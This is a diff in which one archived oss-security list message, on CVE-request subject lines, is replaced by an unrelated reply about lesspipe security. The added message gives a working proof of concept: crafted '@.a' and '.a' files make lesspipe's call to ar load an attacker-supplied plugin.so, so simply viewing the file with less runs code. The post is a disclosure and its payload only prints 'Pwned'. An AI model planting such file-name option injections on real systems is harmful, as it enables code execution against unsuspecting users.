@@ -1,31 +1,56 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/12/09/3
-Message-ID: <20141209020231.GA27212@openwall.com>
-Date: Tue, 9 Dec 2014 05:02:31 +0300
-From: Solar Designer <solar@...nwall.com>
-To: David Cramer <david@...sentry.com>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: CVE Request
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/12/11/6
+Message-ID: <5488E08A.5000704@mccme.ru>
+Date: Thu, 11 Dec 2014 03:08:42 +0300
+From: Alexander Cherepanov <cherepan@...me.ru>
+To: oss-security@...ts.openwall.com
+Subject: Re: so, can we do something about lesspipe? (+ a cpio bug to back up the argument)
 Content-Type: text/plain; charset=utf-8
 
-On Mon, Dec 08, 2014 at 03:28:12PM -0800, David Cramer wrote:
-> (Pardon my complete lack of any clue how this process works) 
-> 
-> Now seems like a good time to formalize our internal policy of how we do security releases, and while we might have already butchered this one, it was suggested we attempt to get a CVE assigned.
-> 
-> Software name and optionally vendor name
-> raven-ruby (part of Sentry)
-> 
-> Type of vulnerability
-> DoS
+On 2014-11-23 12:24, Michal Zalewski wrote:
+> In short, many Linux distributions ship with the 'less' command
+> automagically interfaced to 'lesspipe'-type scripts, usually invoked
+> via LESSOPEN. This is certainly the case for CentOS and Ubuntu.
+>
+> Unfortunately, many of these scripts appear to call a rather large
+> number of third-party tools that likely have not been designed with
+> malicious inputs in mind. On CentOS, lesspipe appears to include
+> things such as groff + troff + grotty, man, and cpio. On Ubuntu,
+> there's isoinfo (?!), ar from binutils, and so on. Ancient and obscure
+> compression utilities and doc converters crop up, too.
 
-I expect someone else will get back to you regarding the CVE request,
-but I'd like to ask that we please always include the affected software
-name and usually also the vulnerability type in the Subject line of
-messages posted in here.  Many of us don't care about CVEs much, but
-would like to notice information about vulnerabilities possibly relevant
-to us.  Also, having two or more mere "CVE Request" threads on the list
-almost at once is confusing.  A better Subject line would have been e.g.
-"CVE Request - raven-ruby (part of Sentry) DoS".  Thanks!
+Yeah, it also leads to funny collisions in command line parsing.
 
-Alexander
+Let's consider `ar` again. If it meets an option starting with '@' it 
+treats the rest of the option as a file name to read additional options 
+from. This can be dangerous but the user is supposed to read help/man 
+and not to run command like `ar tv @file` or `readelf -x *` in an 
+untrusted directory (all utilities from binutils seems to have this 
+feature).
+
+Then `less` enters the game. I don't see anything in --help/man for 
+`less` which hints that '@' is a dangerous char to be in file names. Ok, 
+let's see how it can be combined:
+
+----------------------------------------------------------------------
+
+# imagine that we work in an untrusted dir (unpacked archive or
+# something) and the dir contains the following files
+printf '#include <stdio.h>\nvoid onload(void *v) { puts("Pwned"); }' | \
+   gcc -fPIC -shared -o plugin.so -xc -
+ar rc ./@.a /dev/null
+echo '-s --plugin ./plugin.so ./@.a' > .a
+
+# pretend that our distro activated lesspipe and finally run `less`
+(eval "$(lesspipe)"; less @.a)
+
+----------------------------------------------------------------------
+
+You should see "Pwned" inside `less`.
+
+IMHO it crosses security boundary and should be considered a vuln in 
+lesspipe. It neither validates file names nor documents the dangerous 
+ones. It also perfectly illustrate how fragile this construction is.
+
+-- 
+Alexander Cherepanov
